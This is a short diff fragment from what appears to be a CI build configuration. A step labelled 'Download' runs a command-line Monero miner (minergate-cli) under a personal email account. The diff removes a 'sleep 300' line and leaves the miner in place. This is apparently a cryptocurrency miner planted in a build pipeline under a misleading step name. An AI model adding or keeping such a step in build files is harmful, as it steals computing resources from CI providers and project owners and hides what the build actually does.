@@ -20,4 +20,3 @@ build:
         name: Download
         code: |
           minergate-cli -user yoginth@hotmail.com xmr
-          sleep 300
